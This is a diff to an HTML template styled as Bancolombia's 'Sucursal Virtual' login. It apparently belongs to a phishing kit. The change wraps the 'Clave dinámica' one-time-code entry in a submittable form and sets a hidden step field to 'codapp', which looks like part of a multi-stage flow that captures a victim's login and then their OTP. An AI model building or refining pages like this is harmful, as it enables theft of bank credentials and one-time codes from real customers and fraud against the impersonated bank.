@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
     <title>Bancolombia - Sucursal Virtual</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -222,7 +223,7 @@
         <div id="codapp" class="w-full flex flex-col justify-center items-center pb-6">
             <h5 class="text-[24px] font-cib-sans-bold mt-10">Clave dinámica</h5>
             <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
-                <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
+                <form id="formulario" class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                     <div class="w-full flex items-center justify-center hiddenerror hidden">
                         <span class="text-[11px] text-red-600"> Clave dinámica incorrecta o vencida. Ingresa la nueva
                             clave
@@ -253,16 +254,16 @@
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                         </div>
                     </div>
-                    
+
                     <input type="hidden" id="otpapp" name="otpapp" value="" />
-                    <input type="hidden" id="no-status" name="status" value="login" />
-                    
+                    <input type="hidden" id="no-status" name="status" value="codapp" />
+
                     <button id="enviar"
                         class="mt-4 font-bold py-2 px-6 rounded-full mt-6 disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                         disabled>
                         Continuar
                     </button>
-                </div>
+                </form>
             </div>
         </div>
 
